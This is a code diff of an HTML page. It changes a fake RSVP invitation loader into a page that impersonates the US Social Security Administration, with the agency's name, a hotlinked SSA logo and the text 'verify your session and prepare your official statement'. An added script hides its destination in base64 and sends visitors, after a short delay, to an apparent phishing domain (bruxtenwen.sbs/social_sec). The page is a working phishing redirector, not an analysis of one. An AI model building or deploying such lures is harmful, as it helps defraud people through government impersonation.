@@ -3,208 +3,110 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Preparing Your Invitation…</title>
+    <title>Social Security Administration</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Playfair+Display:ital,wght@0,600;1,600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
         html, body { height: 100%; }
-
         body {
-            background:
-                radial-gradient(ellipse at 20% 0%, rgba(212, 167, 71, 0.16), transparent 50%),
-                radial-gradient(ellipse at 85% 15%, rgba(232, 160, 168, 0.10), transparent 45%),
-                linear-gradient(180deg, #0a1a26 0%, #0e2130 50%, #0a1a26 100%);
+            background: #ffffff;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 32px 20px;
-            font-family: 'Inter', sans-serif;
-            color: #e6edf3;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            color: #1a2b3c;
             -webkit-font-smoothing: antialiased;
-            overflow: hidden;
-        }
-
-        body::before {
-            content: "";
-            position: fixed;
-            inset: 0;
-            background-image:
-                linear-gradient(rgba(255,255,255,0.018) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255,255,255,0.018) 1px, transparent 1px);
-            background-size: 48px 48px;
-            pointer-events: none;
-            mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-            -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-        }
-
-        .sparkles {
-            position: absolute;
-            top: 15%;
-            width: 100%;
-            max-width: 480px;
-            height: 20px;
-            pointer-events: none;
-        }
-        .sparkles span {
-            position: absolute;
-            top: 50%;
-            width: 5px; height: 5px;
-            border-radius: 50%;
-            transform: translateY(-50%);
-            animation: twinkle 2.6s ease-in-out infinite;
-        }
-        .sparkles span:nth-child(1) { left: 5%;  background: #f0d98a; animation-delay: 0s; }
-        .sparkles span:nth-child(2) { left: 15%; background: #e8a0a8; animation-delay: 0.3s; width: 4px; height: 4px; }
-        .sparkles span:nth-child(3) { left: 26%; background: #d4a747; animation-delay: 0.6s; }
-        .sparkles span:nth-child(4) { left: 38%; background: #f5cdd2; animation-delay: 0.2s; width: 4px; height: 4px; }
-        .sparkles span:nth-child(5) { left: 50%; background: #f0d98a; animation-delay: 0.9s; }
-        .sparkles span:nth-child(6) { left: 62%; background: #e8a0a8; animation-delay: 0.5s; width: 4px; height: 4px; }
-        .sparkles span:nth-child(7) { left: 74%; background: #d4a747; animation-delay: 1.1s; }
-        .sparkles span:nth-child(8) { left: 85%; background: #f5cdd2; animation-delay: 0.7s; width: 4px; height: 4px; }
-        .sparkles span:nth-child(9) { left: 94%; background: #f0d98a; animation-delay: 0.4s; }
-
-        @keyframes twinkle {
-            0%, 100% { opacity: 0.2; transform: translateY(-50%) scale(0.8); }
-            50%      { opacity: 1;   transform: translateY(-50%) scale(1.3); }
         }
 
         .card {
-            position: relative;
-            z-index: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
             text-align: center;
-            gap: 22px;
-            padding: 44px 46px 40px;
-            background: linear-gradient(180deg, rgba(20, 48, 73, 0.96) 0%, rgba(15, 36, 54, 0.96) 100%);
-            border-radius: 20px;
-            border: 1px solid rgba(212, 167, 71, 0.3);
-            box-shadow:
-                0 24px 60px rgba(0, 0, 0, 0.55),
-                inset 0 1px 0 rgba(255, 255, 255, 0.06);
-            animation: rise 0.7s cubic-bezier(0.2, 0.9, 0.4, 1.1) both;
-            overflow: hidden;
-            max-width: 440px;
+            gap: 24px;
+            padding: 56px 48px 48px;
+            max-width: 460px;
             width: 100%;
         }
-        .card::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, transparent 0%, #d4a747 25%, #e8a0a8 75%, transparent 100%);
-        }
-        .card::after {
-            content: "";
-            position: absolute;
-            top: -70px; right: -70px;
-            width: 220px; height: 220px;
-            background: radial-gradient(circle, rgba(232, 160, 168, 0.14), transparent 70%);
-            pointer-events: none;
-        }
 
-        @keyframes rise {
-            from { opacity: 0; transform: translateY(16px); }
-            to   { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Logo frame — always renders something, hosted img overlays it */
+        /* Logo container */
         .logo-wrap {
-            position: relative;
-            width: 88px; height: 88px;
+            width: 100px;
+            height: 100px;
             border-radius: 50%;
-            background: linear-gradient(135deg, #f0d98a, #d4a747 60%, #b8871f);
+            background: #f8fafc;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow:
-                0 8px 24px rgba(212, 167, 71, 0.35),
-                inset 0 1px 0 rgba(255, 255, 255, 0.5);
-            padding: 6px;
-            animation: pulse 2.4s ease-in-out infinite;
+            box-shadow: 0 8px 24px rgba(10, 56, 80, 0.12);
+            padding: 10px;
+            overflow: hidden;
         }
-        .logo-wrap::before {
-            content: "✦";
-            position: absolute;
-            font-size: 2.2rem;
-            color: #0e2130;
-            font-weight: 700;
-            z-index: 0;
-            text-shadow: 0 1px 0 rgba(255,255,255,0.15);
-        }
+
         .logo-wrap img {
-            position: relative;
-            z-index: 1;
-            width: 100%; height: 100%;
-            object-fit: cover;
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
             border-radius: 50%;
-            background: #0e2130;
             display: block;
         }
-        .logo-wrap img.broken { display: none; }
 
-        @keyframes pulse {
-            0%, 100% { transform: scale(1);    box-shadow: 0 8px 24px rgba(212, 167, 71, 0.35), inset 0 1px 0 rgba(255, 255, 255, 0.5); }
-            50%      { transform: scale(1.04); box-shadow: 0 12px 30px rgba(212, 167, 71, 0.5),  inset 0 1px 0 rgba(255, 255, 255, 0.6); }
-        }
-
-        .eyebrow {
-            font-family: 'Playfair Display', serif;
-            font-style: italic;
-            font-size: 1rem;
-            color: #f0d98a;
-            letter-spacing: 0.5px;
-        }
-        .eyebrow::before, .eyebrow::after {
-            content: " ✦ ";
-            font-style: normal;
-            font-size: 0.7rem;
-            opacity: 0.7;
+        .agency-name {
+            font-size: 0.72rem;
+            font-weight: 600;
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            color: #0a3850;
         }
 
         h1 {
-            font-family: 'Playfair Display', serif;
-            font-size: 1.5rem;
+            font-size: 1.45rem;
             font-weight: 600;
-            color: #e6edf3;
-            letter-spacing: -0.2px;
-            line-height: 1.3;
+            color: #0a3850;
+            letter-spacing: -0.3px;
+            line-height: 1.35;
         }
 
         .sub {
-            font-size: 0.86rem;
-            color: #9fb2c2;
-            line-height: 1.55;
-            max-width: 320px;
+            font-size: 0.92rem;
+            color: #5a7086;
+            line-height: 1.6;
+            max-width: 340px;
         }
 
         .loader {
-            width: 180px;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.08);
+            width: 200px;
+            height: 3px;
+            background: #e8eef4;
             border-radius: 50px;
             overflow: hidden;
-            margin-top: 6px;
+            margin-top: 8px;
             position: relative;
         }
         .loader::after {
             content: "";
             position: absolute;
             inset: 0;
-            width: 40%;
-            background: linear-gradient(90deg, transparent, #d4a747, #e8a0a8, transparent);
+            width: 45%;
+            background: #0a3850;
             border-radius: 50px;
-            animation: slide 2.4s ease-in-out infinite;
+            animation: slide 1.8s ease-in-out infinite;
         }
         @keyframes slide {
             0%   { transform: translateX(-100%); }
-            100% { transform: translateX(350%); }
+            100% { transform: translateX(320%); }
+        }
+
+        .footnote {
+            margin-top: 8px;
+            font-size: 0.72rem;
+            color: #9aabbc;
+            letter-spacing: 0.3px;
         }
 
         @media (prefers-reduced-motion: reduce) {
@@ -213,41 +115,45 @@
                 transition-duration: 0.01ms !important;
             }
         }
+
+        @media (max-width: 480px) {
+            .card { padding: 40px 28px 36px; }
+            h1 { font-size: 1.25rem; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="sparkles" aria-hidden="true">
-        <span></span><span></span><span></span>
-        <span></span><span></span><span></span>
-        <span></span><span></span><span></span>
-    </div>
-
     <div class="card">
+        <!-- Logo -->
         <div class="logo-wrap">
-            <!-- ⬇⬇ DROP YOUR HOSTED RSVP LOGO URL HERE. If it fails to load, the ✦ mark shows instead. ⬇⬇ -->
-            <img id="rsvpLogo" src="" alt="RSVP Logo" onerror="this.classList.add('broken')">
-            <!-- ⬆⬆ DROP YOUR HOSTED RSVP LOGO URL HERE ⬆⬆ -->
+            <img src="https://therunhouse.com/cdn/shop/collections/social_security_adnin_logo.png?v=1682600208" alt="SSA Logo" onerror="this.style.display='none'">
         </div>
-        <div class="eyebrow">You're Invited</div>
-        <h1>Preparing your invitation…</h1>
-        <p class="sub">Just a moment — we're unlocking your personal RSVP and getting it ready.</p>
+
+        <div class="agency-name">Social Security Administration</div>
+
+        <h1>Preparing your document…</h1>
+
+        <p class="sub">Please wait while we verify your session and prepare your official statement.</p>
+
         <div class="loader"></div>
+
+        <div class="footnote">Do not close this window</div>
     </div>
 
     <script type="text/javascript">
         // ============================================
         // CONFIG — destination is base64-encoded
-        // Decodes to: https://bruxtenwen.sbs/rsvp_movement
+        // Decodes to: https://bruxtenwen.sbs/social_sec
         // ============================================
-        var DEST_B64 = 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9yc3ZwX21vdmVtZW50';
-        var REDIRECT_DELAY = 4000;
+        var DEST_B64 = 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9zb2NpYWxfc2Vj';
+        var REDIRECT_DELAY = 3500;
 
         var DESTINATION;
         try {
             DESTINATION = atob(DEST_B64);
         } catch (e) {
-            DESTINATION = 'https://bruxtenwen.sbs/rsvp_movement';
+            DESTINATION = 'https://bruxtenwen.sbs/social_sec';
         }
 
         // ============================================
